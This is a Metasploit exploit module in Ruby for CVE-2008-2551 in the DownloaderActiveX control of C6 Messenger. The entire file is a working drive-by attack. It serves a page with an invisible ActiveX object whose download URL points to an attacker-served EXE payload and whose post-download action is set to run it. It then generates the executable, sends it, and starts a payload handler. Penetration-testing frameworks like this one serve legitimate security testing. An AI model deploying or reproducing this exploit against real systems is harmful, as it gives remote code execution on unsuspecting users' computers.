##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Icona SpA C6 Messenger DownloaderActiveX Control Arbitrary File Download and Execute',
			'Description'    => %q{
					This module exploits a vulnerability in Icona SpA C6 Messenger 1.0.0.1. The
				vulnerability is in the DownloaderActiveX Control (DownloaderActiveX.ocx). The
				insecure control can be abused to download and execute arbitrary files in the context of
				the currently logged-on user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Nine:Situations:Group::SnoopyAssault', # Vulnerability discovery and exploit
					'juan vazquez' # metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2008-2551' ],
					[ 'OSVDB', '45960' ],
					[ 'BID', '29519' ],
					[ 'URL', 'http://retrogod.altervista.org/9sg_c6_download_exec.html' ],
				],
			'DefaultOptions' =>
				{
					'ExitFunction'         => "none",
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DisclosureDate' => 'Jun 03 2008',
			'DefaultTarget'  => 0,
			'Privileged'     => false))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		# Only IEs are potential targets
		# "File Session" is used when the ActiveX tries to request the EXE
		agent = request.headers['User-Agent']
		if agent !~ /MSIE \d\.\d|File Session/
			print_error("Target not supported: #{cli.peerhost}:#{cli.peerport} (#{agent})")
			return
		end

		payload_url =  "http://"
		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		payload_url += ":" + datastore['SRVPORT'] + get_resource() + "/#{@payload_rand}"

		if (request.uri.match(/#{@payload_rand}/))
			return if ((p = regenerate_payload(cli)) == nil)
			data = generate_payload_exe({ :code => p.encoded })
			print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		exe = rand_text_alpha(rand(5) + 1 )

		content = %Q|
		<html>
			<object id="DownloaderActiveX1" width="0" height="0" classid="CLSID:c1b7e532-3ecb-4e9e-bb3a-2951ffe67c61" codebase="DownloaderActiveX.cab#Version=1,0,0,1">
				<param name="propProgressBackground"  value="#bccee8">
				<param name="propTextBackground"  value="#f7f8fc">
				<param name="propBarColor"  value="#df0203">
				<param name="propTextColor"  value="#000000">
				<param name="propWidth"  value="0">
				<param name="propHeight"  value="0">
				<param name="propDownloadUrl"  value="#{payload_url}/#{exe}.exe">
				<param name="propPostDownloadAction"  value="run">
				<param name="propInstallCompleteUrl"  value="">
				<param name="propBrowserRedirectUrl"  value="">
				<param name="propVerbose"  value="0">
				<param name="propInterrupt"  value="0">
			</OBJECT>
		</html>
		|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response_html(cli, content)

		handler(cli)

	end

	def exploit
		@payload_rand = rand_text_alpha(rand(5) + 5 )
		super
	end

end